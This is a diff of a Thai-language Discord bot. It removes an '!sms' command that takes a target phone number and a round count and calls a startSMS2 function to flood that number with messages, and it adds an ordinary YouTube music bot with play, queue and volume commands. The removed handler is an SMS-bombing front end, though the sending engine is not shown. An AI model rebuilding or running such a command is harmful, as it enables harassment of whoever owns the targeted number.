-    # ป้องกันไม่ให้บอทรันคำสั่งของตัวเอง
-    if message.author == client.user:
-        return
+@bot.tree.command(name='play', description='เล่นเพลงจากชื่อหรือลิงก์ YouTube')
+@app_commands.describe(query='ชื่อเพลง หรือ URL ของคลิป')
+async def play(interaction: discord.Interaction, query: str):
+    if not interaction.user.voice:
+        embed = create_simple_embed(
+            "ไม่สามารถเล่นได้",
+            "คุณต้องเข้าร่วมห้องเสียงก่อนใช้คำสั่งนี้!",
+            COLORS['danger'],
+            "`❌`"
+        )
+        return await interaction.response.send_message(embed=embed, ephemeral=True)
 
-    # ตรวจจับพิมพ์คำสั่งเริ่มต้นด้วย !sms
-    if message.content.startswith('!sms'):
-        try:
-            # แยกข้อความออกเป็นส่วน ๆ เช่น ['!sms', '095xxxxxxx', '50']
-            args = message.content.split()
-            
-            # ถ้าพิมพ์มาไม่ครบตามรูปแบบ ให้แจ้งวิธีใช้
-            if len(args) < 3:
-                embed = discord.Embed(
-                    title="❌ รูปแบบคำสั่งไม่ถูกต้อง",
-                    description="**กรุณาพิมพ์รูปแบบ: `!sms [เบอร์โทรศัพท์] [จำนวนรอบ]`**\nตัวอย่างเช่น: `!sms 0951234567 50`",
-                    color=0xFF0000
-                )
-                await message.reply(embed=embed)
-                return
+    await interaction.response.defer()
 
-            phone = args[1]
-            count_str = args[2]
+    vc = interaction.guild.voice_client
+    if vc is None:
+        await interaction.user.voice.channel.connect()
 
-            # ตรวจสอบความยาวของเบอร์โทรศัพท์
-            if len(phone) != 10 or not phone.isdigit():
-                embed = discord.Embed(
-                    title="❌ รูปแบบเบอร์โทรไม่ถูกต้อง",
-                    description="**กรุณาระบุเบอร์โทรศัพท์ให้ครบ 10 หลักและเป็นตัวเลขเท่านั้น**",
-                    color=0xFF0000
-                )
-                await message.reply(embed=embed)
-                return
+    loading_embed = discord.Embed(
+        title="`⏳` กำลังค้นหา",
+        description=f"> กำลังค้นหา **{query}**...\n> กรุณารอสักครู่",
+        color=COLORS['info'],
+        timestamp=datetime.now(timezone.utc)
+    )
+    loading_embed.set_footer(text="🔍 กำลังประมวลผล...")
+    loading = await interaction.followup.send(embed=loading_embed)
 
-            count = int(count_str)
+    try:
+        if not query.startswith('http'):
+            query = f"ytsearch:{query}"
 
-            # ตรวจสอบจำนวนรอบไม่ให้เกินกำหนด
-            if count > spam_max or count <= 0:
-                embed = discord.Embed(
-                    title="❌ ทำรายการไม่สำเร็จ",
-                    description=f"**กรุณาระบุจำนวนรอบตั้งแต่ 1 ถึงสูงสุดไม่เกิน {spam_max} รอบ**",
-                    color=0xFF0000
-                )
-                await message.reply(embed=embed)
-                return
+        player = await YTDLSource.from_url(query, loop=bot.loop, stream=True)
+        player.requester = interaction.user
 
-            # ถ้าเงื่อนไขผ่านทั้งหมด ให้เริ่มทำการยิงและส่งข้อความบอกผู้ใช้
-            embed = discord.Embed(
-                title=f"🟢 {title_ui}",
-                description=f"**เริ่มส่งข้อความไปที่เบอร์ {phone} แล้วจำนวน {count} รอบ!**\n{des}",
-                color=0x0B0FC3
+        guild_id = interaction.guild.id
+        if guild_id not in queues:
+            queues[guild_id] = []
+
+        queues[guild_id].append(player)
+
+        if not interaction.guild.voice_client.is_playing() and not interaction.guild.voice_client.is_paused():
+            try:
+                await loading.delete()
+            except:
+                pass
+            await play_next(interaction)
+        else:
+            success_embed = discord.Embed(
+                title="`✅` เพิ่มเข้าคิวแล้ว",
+                description=f"> **[{player.title}]({player.webpage_url})**",
+                color=COLORS['success'],
+                timestamp=datetime.now(timezone.utc)
             )
-            if url:
-                embed.set_image(url=url)
-                
-            await message.reply(embed=embed)
-            
-            # สั่งให้เอนจิ้น Thread ทำงานส่ง SMS
-            startSMS2(phone, count)
 
-        except ValueError:
-            embed = discord.Embed(
-                title="❌ ทำรายการไม่สำเร็จ",
-                description="**เนื่องจากคุณระบุรูปแบบจำนวนรอบไม่ใช่ตัวเลขที่ถูกต้อง**",
-                color=0xFF0000
+            success_embed.add_field(
+                name="`📊` ข้อมูล",
+                value=f"`👤` **ช่อง:** {player.uploader}\n`⏱️` **ระยะเวลา:** {format_duration(player.duration)}\n`📝` **ตำแหน่งในคิว:** #{len(queues[guild_id])}",
+                inline=False
             )
-            await message.reply(embed=embed)
-        except Exception as e:
-            print(f"เกิดข้อผิดพลาด: {e}")
 
-def keep_alive():
-    import time
-    while True:
-        time.sleep(3600)
+            success_embed.add_field(
+                name="`🎤` ขอโดย",
+                value=interaction.user.mention,
+                inline=True
+            )
 
-import threading
-threading.Thread(target=keep_alive, daemon=True).start()
+            if player.thumbnail:
+                success_embed.set_thumbnail(url=player.thumbnail)
 
-# สั่งรันบอตด้วยคำสั่งภาษาอังกฤษมาตรฐาน (ห้ามใช้คำว่า ลูกทีม.วิ่ง)
-client.run(os.getenv('DISCORD_TOKEN'))
+            success_embed.set_footer(
+                text=f"ขอโดย {interaction.user.display_name}",
+                icon_url=interaction.user.avatar.url if interaction.user.avatar else None
+            )
+
+            await loading.edit(embed=success_embed)
+
+            if guild_id in control_messages:
+                try:
+                    embed = create_now_playing_embed(interaction)
+                    await control_messages[guild_id].edit(embed=embed)
+                except:
+                    pass
+
+    except Exception as e:
+        error_embed = discord.Embed(
+            title="`❌` เกิดข้อผิดพลาด",
+            description=f"> 不ไม่สามารถเล่นเพลงได้",
+            color=COLORS['danger'],
+            timestamp=datetime.now(timezone.utc)
+        )
+
+        error_embed.add_field(
+            name="`📝` รายละเอียด",
+            value=f"```{str(e)[:200]}
+```",
+            inline=False
+        )
+
+        error_embed.set_footer(text="💡 ลองใช้คำค้นหาอื่นหรือลิงก์ที่ถูกต้อง")
+        await loading.edit(embed=error_embed)
+
+async def play_next(interaction: discord.Interaction):
+    guild_id = interaction.guild.id
+    vc = interaction.guild.voice_client
+    
+    if guild_id in queues and len(queues[guild_id]) > 0:
+        player = queues[guild_id].pop(0)
+        now_playing[guild_id] = player
+        start_times[guild_id] = time.time()
+
+        def after_playing(error):
+            if error:
+                print(f'Error: {error}')
+            coro = play_next(interaction)
+            fut = asyncio.run_coroutine_threadsafe(coro, bot.loop)
+            try:
+                fut.result()
+            except:
+                pass
+
+        if vc:
+            vc.play(player, after=after_playing)
+
+        embed = create_now_playing_embed(interaction)
+        view = MusicControlView(interaction)
+
+        if guild_id in control_messages:
+            try:
+                await control_messages[guild_id].delete()
+            except:
+                pass
+
+        channel = interaction.channel
+        message = await channel.send(embed=embed, view=view)
+        control_messages[guild_id] = message
+    else:
+        if vc:
+            now_playing.pop(guild_id, None)
+            start_times.pop(guild_id, None)
+            
+            if guild_id in control_messages:
+                try:
+                    await control_messages[guild_id].delete()
+                except:
+                    pass
+                control_messages.pop(guild_id, None)
+            
+            embed = discord.Embed(
+                title="`👋` เพลงหมดแล้ว",
+                description="> ไม่มีเพลงในคิวแล้ว บอทจะออกจากห้องเสียง",
+                color=COLORS['info'],
+                timestamp=datetime.now(timezone.utc)
+            )
+            embed.set_footer(text="🎵 ใช้ /play เพื่อเล่นเพลงอีกครั้ง")
+            await interaction.channel.send(embed=embed)
+            
+            await asyncio.sleep(2)
+            if vc:
+                await vc.disconnect()
+
+@bot.tree.command(name='volume', description='ปรับระดับเสียง หรือดูระดับเสียงปัจจุบัน')
+@app_commands.describe(vol='ระดับเสียง (0-100)')
+async def volume(interaction: discord.Interaction, vol: int = None):
+    vc = interaction.guild.voice_client
+    if vol is None:
+        current_vol = 50
+        if vc and vc.source:
+            current_vol = int(vc.source.volume * 100)
+
+        emoji = "🔇" if current_vol == 0 else "🔉" if current_vol < 50 else "🔊"
+        bar_length = 20
+        filled = int(bar_length * current_vol / 100)
+        volume_bar = "█" * filled + "░" * (bar_length - filled)
+
+        embed = discord.Embed(
+            title=f"{emoji} ควบคุมระดับเสียง",
+            description="> ใช้ปุ่มด้านล่างเพื่อปรับระดับเสียง\n> **การเปลี่ยนแปลงจะมีผลทันที!**",
+            color=COLORS['info'],
+            timestamp=datetime.now(timezone.utc)
+        )
+
+        embed.add_field(
+            name="`🎚️` ระดับเสียงปัจจุบัน",
+            value=f"{current_vol}%\n`{volume_bar}`",
+            inline=False
+        )
+
+        embed.set_footer(text="🎵 Music Bot • Real-time Control")
+        view = VolumeControlView(interaction)
+        return await interaction.response.send_message(embed=embed, view=view)
+
+    if not vc:
+        embed = create_simple_embed(
+            "ไม่สามารถปรับได้",
+            "บอทไม่ได้อยู่ในห้องเสียง",
+            COLORS['danger'],
+            "`❌`"
+        )
+        return await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    if 0 <= vol <= 100:
+        if vc.source and hasattr(vc.source, 'volume'):
+            vc.source.volume = vol / 100
+
+            emoji = "🔇" if vol == 0 else "🔉" if vol < 50 else "🔊"
+            bar_length = 20
+            filled = int(bar_length * vol / 100)
+            volume_bar = "█" * filled + "░" * (bar_length - filled)
+
+            embed = discord.Embed(
+                title=f"{emoji} ปรับระดับเสียงแล้ว",
+                description=f"> ตั้งระดับเสียงเป็น **{vol}%**",
+                color=COLORS['success'],
+                timestamp=datetime.now(timezone.utc)
+            )
+
+            embed.add_field(
+                name="`🎚️` ระดับเสียงใหม่",
+                value=f"`{volume_bar}` **{vol}%**",
+                inline=False
+            )
+
+            embed.set_footer(
+                text=f"ปรับโดย {interaction.user.display_name}",
+                icon_url=interaction.user.avatar.url if interaction.user.avatar else None
+            )
+
+            await interaction.response.send_message(embed=embed)
+        else:
+            embed = create_simple_embed(
+                "ไม่สามารถปรับได้",
+                "ไม่มีเพลงที่กำลังเล่นอยู่",
+                COLORS['danger'],
+                "`❌`"
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+
+        guild_id = interaction.guild.id
+        if guild_id in control_messages:
+            try:
+                np_embed = create_now_playing_embed(interaction)
+                await control_messages[guild_id].edit(embed=np_embed)
+            except:
+                pass
+    else:
+        embed = create_simple_embed(
+            "ค่าไม่ถูกต้อง",
+            "ระดับเสียงต้องอยู่ระหว่าง **0-100**",
+            COLORS['danger'],
+            "`❌`"
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name='pause', description='หยุดเล่นเพลงชั่วคราว')
+async def pause(interaction: discord.Interaction):
+    vc = interaction.guild.voice_client
+    if vc and vc.is_playing():
+        vc.pause()
+        embed = create_simple_embed("หยุดชั่วคราว", "หยุดเพลงชั่วคราวแล้ว", COLORS['warning'], "`⏸️`")
+        await interaction.response.send_message(embed=embed)
+
+        guild_id = interaction.guild.id
+        if guild_id in control_messages:
+            try:
+                np_embed = create_now_playing_embed(interaction)
+                await control_messages[guild_id].edit(embed=np_embed)
+            except:
+                pass
+    else:
+        embed = create_simple_embed("ไม่สามารถหยุดได้", "ไม่มีเพลงที่กำลังเล่นอยู่", COLORS['danger'], "`❌`")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name='resume', description='เล่นเพลงต่อจากที่หยุดไว้')
+async def resume(interaction: discord.Interaction):
+    vc = interaction.guild.voice_client
+    if vc and vc.is_paused():
+        vc.resume()
+        embed = create_simple_embed("เล่นต่อ", "เล่นเพลงต่อแล้ว", COLORS['success'], "`▶️`")
+        await interaction.response.send_message(embed=embed)
+
+        guild_id = interaction.guild.id
+        if guild_id in control_messages:
+            try:
+                np_embed = create_now_playing_embed(interaction)
+                await control_messages[guild_id].edit(embed=np_embed)
+            except:
+                pass
+    else:
+        embed = create_simple_embed("ไม่สามารถเล่นต่อได้", "เพลงไม่ได้หยุดอยู่", COLORS['danger'], "`❌`")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name='skip', description='ข้ามเพลงปัจจุบัน')
+async def skip(interaction: discord.Interaction):
+    vc = interaction.guild.voice_client
+    if vc and vc.is_playing():
+        guild_id = interaction.guild.id
+        next_count = len(queues[guild_id]) if guild_id in queues else 0
+
+        vc.stop()
+
+        embed = discord.Embed(
+            title="`⏭️` ข้ามเพลง",
+            description="> ข้ามไปเพลงถัดไปแล้ว",
+            color=COLORS['info'],
+            timestamp=datetime.now(timezone.utc)
+        )
+
+        if next_count > 0:
+            embed.add_field(
+                name="`📝` เพลงถัดไป",
+                value=f"`{next_count}` เพลงในคิว",
+                inline=False
+            )
+
+        embed.set_footer(
+            text=f"ขอโดย {interaction.user.display_name}",
+            icon_url=interaction.user.avatar.url if interaction.user.avatar else None
+        )
+
+        await interaction.response.send_message(embed=embed)
+    else:
+        embed = create_simple_embed("ไม่สามารถข้ามได้", "ไม่มีเพลงที่กำลังเล่นอยู่", COLORS['danger'], "`❌`")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name='stop', description='หยุดเล่นเพลงและล้างคิวทั้งหมด')
+async def stop(interaction: discord.Interaction):
+    guild_id = interaction.guild.id
+    queue_count = len(queues[guild_id]) if guild_id in queues else 0
+
+    if guild_id in queues:
+        queues[guild_id].clear()
+
+    vc = interaction.guild.voice_client
+    if vc:
+        vc.stop()
+
+    embed = discord.Embed(
+        title="`⏹️` หยุดการเล่น",
+        description="> หยุดเพลงและล้างคิวทั้งหมดแล้ว",
+        color=COLORS['danger'],
+        timestamp=datetime.now(timezone.utc)
+    )
+
+    if queue_count > 0:
+        embed.add_field(
+            name="`📝` ล้างคิว",
+            value=f"ลบ `{queue_count}` เพลงออกจากคิว",
+            inline=False
+        )
+
+    embed.set_footer(
+        text=f"ขอโดย {interaction.user.display_name}",
+        icon_url=interaction.user.avatar.url if interaction.user.avatar else None
+    )
+
+    await interaction.response.send_message(embed=embed)
+
+@bot.tree.command(name='join', description='เชิญบอทเข้าห้องเสียงของคุณ')
+async def join(interaction: discord.Interaction):
+    if not interaction.user.voice:
+        embed = create_simple_embed(
+            "ไม่สามารถเข้าร่วมได้",
+            "คุณต้องอยู่ในห้องเสียงก่อน!",
+            COLORS['danger'],
+            "`❌`"
+        )
+        return await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    channel = interaction.user.voice.channel
+    vc = interaction.guild.voice_client
+
+    if vc:
+        await vc.move_to(channel)
+    else:
+        await channel.connect()
+
+    embed = discord.Embed(
+        title="`✅` เชื่อมต่อแล้ว",
+        description=f"> เข้าร่วมห้องเสียง **{channel.name}** แล้ว",
+        color=COLORS['success'],
+        timestamp=datetime.now(timezone.utc)
+    )
+
+    embed.add_field(
+        name="`🎵` พร้อมเล่นเพลง",
+        value=f"ใช้ `/play` เพื่อเริ่มเล่นเพลง",
+        inline=False
+    )
+
+    embed.set_footer(
+        text=f"เชิญโดย {interaction.user.display_name}",
+        icon_url=interaction.user.avatar.url if interaction.user.avatar else None
+    )
+
+    await interaction.response.send_message(embed=embed)
+
+@bot.tree.command(name='leave', description='เตะบอทออกจากห้องเสียง')
+async def leave(interaction: discord.Interaction):
+    vc = interaction.guild.voice_client
+    if vc:
+        guild_id = interaction.guild.id
+        queue_count = len(queues[guild_id]) if guild_id in queues else 0
+
+        for key in [queues, now_playing, control_messages, start_times]:
+            key.pop(guild_id, None)
+
+        channel_name = vc.channel.name
+        await vc.disconnect()
+
+        embed = discord.Embed(
+            title="`👋` ออกจากห้องเสียง",
+            description=f"> ออกจากห้องเสียง **{channel_name}** แล้ว",
+            color=COLORS['info'],
+            timestamp=datetime.now(timezone.utc)
+        )
+
+        if queue_count > 0:
+            embed.add_field(
+                name="`📝` ล้างข้อมูล",
+                value=f"ลบคิว `{queue_count}` เพลงและข้อมูลทั้งหมด",
+                inline=False
+            )
+
+        embed.set_footer(
+            text=f"ขอโดย {interaction.user.display_name}",
+            icon_url=interaction.user.avatar.url if interaction.user.avatar else None
+        )
+
+        await interaction.response.send_message(embed=embed)
+    else:
+        embed = create_simple_embed(
+            "ไม่สามารถออกได้",
+            "บอทไม่ได้อยู่ในห้องเสียง",
+            COLORS['danger'],
+            "`❌`"
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name='queue', description='ดูรายการเพลงทั้งหมดในคิว')
+async def queue(interaction: discord.Interaction):
+    guild_id = interaction.guild.id
+
+    if guild_id not in queues or not queues[guild_id]:
+        embed = create_simple_embed("คิวว่าง", "ไม่มีเพลงในคิว ใช้ `/play` เพื่อเพิ่มเพลง", COLORS['info'], "`📭`")
+        return await interaction.response.send_message(embed=embed)
+
+    queue_list = ""
+    total_duration = 0
+
+    for i, song in enumerate(queues[guild_id][:10], 1):
+        duration = format_duration(song.duration)
+        queue_list += f"`{i}.` **{song.title}** `[{duration}]`\n"
+        total_duration += song.duration if song.duration else 0
+
+    if len(queues[guild_id]) > 10:
+        remaining = len(queues[guild_id]) - 10
+        queue_list += f"\n`✨` *...และอีก {remaining} เพลง*"
+
+    embed = discord.Embed(
+        title="`📝` รายการคิว",
+        description=queue_list,
+        color=COLORS['purple'],
+        timestamp=datetime.now(timezone.utc)
+    )
+
+    stats = f"`🎵` **จำนวน:** `{len(queues[guild_id])}` เพลง\n"
+    stats += f"`⏱️` **เวลารวม:** `{format_duration(total_duration)}`"
+    embed.add_field(name="`📊` สถิติ", value=stats, inline=False)
+
+    embed.set_footer(
+        text=f"ดูโดย {interaction.user.display_name}",
+        icon_url=interaction.user.avatar.url if interaction.user.avatar else None
+    )
+
+    await interaction.response.send_message(embed=embed)
+
+@bot.tree.command(name='nowplaying', description='ดูรายละเอียดของเพลงที่กำลังเล่นอยู่')
+async def nowplaying(interaction: discord.Interaction):
+    guild_id = interaction.guild.id
+    vc = interaction.guild.voice_client
+
+    if guild_id in now_playing and vc and vc.is_playing():
+        embed = create_now_playing_embed(interaction)
+        view = MusicControlView(interaction)
+        await interaction.response.send_message(embed=embed, view=view)
+    else:
+        embed = create_simple_embed(
+            "ไม่มีเพลง",
+            "ไม่มีเพลงที่กำลังเล่นอยู่ ใช้ `/play` เพื่อเล่นเพลง",
+            COLORS['danger'],
+            "`❌`"
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name='help', description='แสดงวิธีใช้งานและคำสั่งทั้งหมดของบอท')
+async def help_cmd(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="`🎵` คำสั่งบอทเพลง",
+        description="> **บอทเพลงที่อัพเดทแบบเรียลไทม์!**\n> ใช้ปุ่มและคำสั่งด้านล่างเพื่อควบคุมเพลง",
+        color=COLORS['primary'],
+        timestamp=datetime.now(timezone.utc)
+    )
+
+    basic_commands = (
+        "`/play <เพลง/URL>` - เล่นเพลง\n"
+        "`/pause` - หยุดชั่วคราว\n"
+        "`/resume` - เล่นต่อ\n"
+        "`/skip` - ข้ามเพลง\n"
+        "`/stop` - หยุดและล้างคิว"
+    )
+    embed.add_field(name="`🎮` คำสั่งพื้นฐาน", value=basic_commands, inline=False)
+
+    queue_commands = (
+        "`/queue` - แสดงคิว\n"
+        "`/nowplaying` - เพลงปัจจุบัน"
+    )
+    embed.add_field(name="`📝` คิวและข้อมูล", value=queue_commands, inline=True)
+
+    connection_commands = (
+        "`/join` - เข้าห้องเสียง\n"
+        "`/leave` - ออกห้องเสียง"
+    )
+    embed.add_field(name="`🔌` การเชื่อมต่อ", value=connection_commands, inline=True)
+
+    settings_commands = (
+        "`/volume [0-100]` - ปรับเสียง"
+    )
+    embed.add_field(name="`⚙️` ตั้งค่า", value=settings_commands, inline=False)
+
+    features = (
+        "`🎚️` ปรับเสียง\n"
+        "`🎮` ปุ่มควบคุมแบบ Interactive\n"
+        "`🚪` ออกอัตโนมัติเมื่อเพลงหมด"
+    )
+    embed.add_field(name="`✨` ฟีเจอร์พิเศษ", value=features, inline=False)
+
+    embed.set_footer(
+        text="🎵 Music Bot",
+        icon_url="https://cdn-icons-png.flaticon.com/512/727/727245.png"
+    )
+
+    avatar_url = bot.user.avatar.url if bot.user.avatar else None
+    embed.set_thumbnail(url=avatar_url)
+
+    await interaction.response.send_message(embed=embed)
+
+@bot.event
+async def on_voice_state_update(member, before, after):
+    if member == bot.user and before.channel and not after.channel:
+        guild_id = before.channel.guild.id
+        for key in [queues, now_playing, control_messages, start_times]:
+            key.pop(guild_id, None)
+
+if __name__ == "__main__":
+    TOKEN = 'YOUR_BOT_TOKEN_HERE'  # นำ Token ของคุณมาใส่ที่นี่
+    bot.run(TOKEN)
